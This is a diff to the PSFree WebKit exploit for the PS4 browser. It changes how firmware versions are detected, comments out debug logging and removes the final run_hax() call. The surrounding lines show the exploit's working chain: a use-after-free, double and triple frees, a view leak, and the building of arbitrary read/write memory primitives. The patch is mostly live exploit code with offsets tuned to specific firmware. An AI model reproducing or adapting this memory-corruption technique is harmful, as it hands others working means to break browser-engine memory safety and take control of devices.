@@ -425,7 +425,7 @@ function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
     write64(view_rstr, strimpl_m_data, old_m_data);
 
     if (res === null) {
-        die('not found');
+        die('view not found');
     }
     return res;
 }
@@ -502,7 +502,8 @@ function setup_ssv_data(reader) {
     // sizeof WTF::Vector<T>
     const size_vector = 0x10;
     // sizeof JSC::ArrayBufferContents
-    const size_abc = target === ps4_9_00 ? 0x18 : 0x20;
+    const size_abc = (window.fw_float >= 3.00) ? 0x18 : 0x20;
+    //alert("size_abc=0x" + size_abc.toString(16));
 
     // WTF::Vector<unsigned char>
     const m_data = new Uint8Array(size_vector);
@@ -545,7 +546,7 @@ function setup_ssv_data(reader) {
     // PS4 8.03.
     const worker = new Uint8Array(new ArrayBuffer(1));
 
-    if (target !== ps4_9_00) {
+    if (size_abc === 0x20) {
         // m_destructor
         write64(abc, 0, Int.Zero);
         // m_shared
@@ -630,7 +631,7 @@ async function setup_arw(save, ssv_data) {
 
     for (const msg of msgs) {
         if (msg.data !== '') {
-            debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
+            //debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
 
 
             const u = new Uint8Array(msg.data);
@@ -713,22 +714,22 @@ async function get_ready() {
 }
 
 async function run_psfree() {
-    debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
     await get_ready();
 
-    debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
     await use_after_free(pop, s1);
 
     // we trigger the leak first because it is more likely to work
     // than if it were to happen during the second ssv smashing
     // on the ps4
-    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
     // * keeps setup_ar()'s total sleep even lower
     // * also helps the garbage collector scheduling for 9.xx
     await sleep(0);
     await double_free(s1);
 
-    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
     await triple_free(s1, jsview, view_leak_arr, view_leak);
 
     // clear_log();
@@ -791,6 +792,5 @@ async function run_psfree() {
     };
 
     window.p = prim;
-    run_hax();
 }
 
